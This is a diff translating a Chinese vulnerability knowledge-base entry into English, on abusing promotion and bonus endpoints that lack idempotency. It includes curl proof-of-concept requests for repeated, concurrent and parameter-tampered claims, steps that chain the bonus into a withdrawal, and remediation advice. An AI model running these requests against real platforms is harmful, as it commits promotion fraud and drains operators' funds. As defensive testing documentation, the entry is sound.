@@ -1,60 +1,60 @@
 ﻿---
-title: 活动 / 彩金 / 返水无限领取（幂等缺失）
-cve: 无（业务逻辑）
+title: Unlimited promotion / bonus / rebate claims (missing idempotency)
+cve: None (business logic)
 severity: high
 cvss: 7.9
-product: 促销活动与奖励接口
-versions: 任意
+product: Promotion and reward endpoints
+versions: Any
 ports: 80, 443
-keywords: promotion, bonus, 彩金, 返水, 幂等, 并发领取, 活动滥用
-entry: /api/promotion/receive 重复或并发领取
+keywords: promotion, bonus, bonus funds, rebate, idempotency, concurrent claims, promotion abuse
+entry: Repeated or concurrent claims through /api/promotion/receive
 verified: false
-sources: 公开资料整理（业务逻辑类，无 CVE）
+sources: Compiled from public sources (business logic flaws; no CVE)
 ---
 
-## 指纹
+## Fingerprints
 
 ```
 /api/promotion/receive     /api/bonus/claim
 /api/activity/reward       /api/rebate/claim?date=
-领取记录里只有一张表，无唯一约束
+Claim records use a single table without a uniqueness constraint
 ```
 
-## 前置条件
+## Prerequisites
 
-- 账号（可注册多个用于对照，但只用自己名下的）。
+- An account (multiple accounts may be registered for comparison, but use only accounts you own).
 
 ## PoC
 
 ```bash
-# A. 重复领取同一活动
+# A. Claim the same promotion repeatedly
 for i in 1 2 3; do curl -s -X POST https://target/api/promotion/receive \
   -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
   -d '{"promotionId":12}'; echo; done
 
-# B. 并发领取（同一请求 10 并发）
+# B. Concurrent claims (10 concurrent copies of the same request)
 seq 10 | xargs -P 10 -I{} curl -s -o /dev/null -X POST https://target/api/promotion/receive \
   -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' -d '{"promotionId":12}'
 
-# C. 参数篡改（金额/档位）
+# C. Parameter tampering (amount/tier)
 curl -s -X POST https://target/api/promotion/receive \
   -d '{"promotionId":12,"amount":9999,"level":"vip9"}'
 ```
 
-## 利用步骤
+## Exploitation Steps
 
-1. 记录领取前余额 → 重复/并发领取 → 看余额增加次数与领取记录条数。
-2. 判定：同一活动被领取多次（记录表多条）或余额复利增加即成立。
-3. 参数篡改：`amount`/`level`/`vip` 是否影响奖励额（生效⇒服务端信客户端）。
-4. 组合：彩金到账 → 下注 → 走提现链路（`withdraw-approval-idor.md`）看是否可提。
-5. 证据：领取前后余额 + 记录条数；只用自己的账号。
+1. Record the pre-claim balance → make repeated/concurrent claims → inspect the number of balance increases and claim records.
+2. Confirmation: the same promotion is claimed multiple times (multiple table records), or the balance increases cumulatively.
+3. Parameter tampering: do `amount`/`level`/`vip` affect the reward amount (if so, the server trusts the client)?
+4. Chain: bonus credited → place a bet → follow the withdrawal chain (`withdraw-approval-idor.md`) to check withdrawability.
+5. Evidence: before/after balances + record counts; use only your own accounts.
 
-## 修复与缓解（加固）
+## Remediation and Mitigation (Hardening)
 
-- 领取幂等：`(user_id, promotion_id)` 唯一索引；并发用锁或 `INSERT ... ON DUPLICATE`。
-- 奖励金额与档位服务端计算，不接受客户端传值。
-- 活动规则引擎 + 风控（同设备/同 IP/同卡多次领取告警）。
+- Idempotent claims: unique `(user_id, promotion_id)` index; use locks or `INSERT ... ON DUPLICATE` for concurrency.
+- Calculate reward amounts and tiers server-side; do not accept client-supplied values.
+- Promotion rules engine + risk controls (alerts for repeated claims from the same device/IP/card).
 
-## 参考
+## References
 
-- OWASP A04 Insecure Design；CWE-799（Improper Control of Interaction Frequency）。
+- OWASP A04 Insecure Design; CWE-799 (Improper Control of Interaction Frequency).
